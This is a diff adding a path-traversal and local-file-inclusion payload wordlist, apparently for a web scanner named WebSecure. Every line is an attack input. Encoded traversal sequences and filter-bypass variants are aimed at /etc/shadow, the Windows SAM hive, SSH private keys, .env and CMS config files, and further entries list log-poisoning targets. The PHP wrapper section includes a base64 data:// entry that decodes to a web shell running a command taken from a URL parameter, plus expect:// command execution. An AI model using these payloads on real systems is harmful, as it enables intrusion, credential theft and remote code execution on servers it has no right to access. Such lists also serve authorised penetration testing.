@@ -1,0 +1,132 @@
+# WebSecure LFI/Path Traversal Payload List
+# ── Linux absolute paths ──
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/resolv.conf
+/etc/issue
+/etc/os-release
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/fd/0
+/proc/version
+/proc/cpuinfo
+/proc/net/tcp
+/proc/net/fib_trie
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/auth.log
+/var/log/syslog
+/var/log/mail.log
+/var/www/html/index.php
+/var/www/html/.env
+/home/user/.ssh/id_rsa
+/home/user/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.bash_history
+/root/.bashrc
+/tmp/sess_
+# ── Windows absolute paths ──
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\SAM
+C:\Windows\repair\SAM
+C:\Windows\repair\system
+C:\Windows\repair\software
+C:\Windows\repair\security
+C:\Windows\debug\NetSetup.log
+C:\inetpub\wwwroot\web.config
+C:\inetpub\logs\LogFiles\W3SVC1\
+C:\boot.ini
+C:\\windows\\win.ini
+C:\\Windows\\System32\\drivers\\etc\\hosts
+# ── Traversal sequences ──
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+# ── With null byte (older PHP) ──
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd\0
+# ── Double encoding ──
+..%2Fetc%2Fpasswd
+..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252Fetc%252Fpasswd
+# ── URL encoded dots ──
+%2e%2e/etc/passwd
+%2e%2e/%2e%2e/etc/passwd
+..%2f..%2fetc%2fpasswd
+# ── Unicode/UTF-8 bypass ──
+..%c0%afetc%c0%afpasswd
+..%c1%9cetc%c1%9cpasswd
+..%ef%bc%8fetc%ef%bc%8fpasswd
+# ── Windows style ──
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..%5Cwindows%5Cwin.ini
+..%5C..%5Cwindows%5Cwin.ini
+# ── PHP wrappers ──
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=../config.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://input
+php://filter/read=string.toupper/resource=index.php
+phar://./upload/file.phar/shell
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+expect://id
+zip://upload/archive.zip#shell.php
+# ── Log poisoning targets ──
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/httpd/access_log
+/var/log/httpd-access.log
+/var/log/nginx/access.log
+/proc/self/fd/10
+/proc/self/fd/11
+/proc/self/fd/12
+# ── Sensitive config files ──
+../../../../../../../../etc/passwd
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/php/7.4/apache2/php.ini
+/etc/php/8.0/fpm/php.ini
+/etc/mysql/my.cnf
+/etc/postgresql/pg_hba.conf
+/etc/ssh/sshd_config
+/etc/crontab
+/etc/cron.d/
+/etc/environment
+/.env
+/.git/config
+/.git/HEAD
+/.htpasswd
+/.htaccess
+/web.config
+/config.php
+/configuration.php
+/config.inc.php
+/wp-config.php
+/wp-config-sample.php
+/app/config/database.yml
+/config/database.yml
+/config/secrets.yml
+/config/application.yml
+/settings.py
+/local_settings.py
+/config/config.php
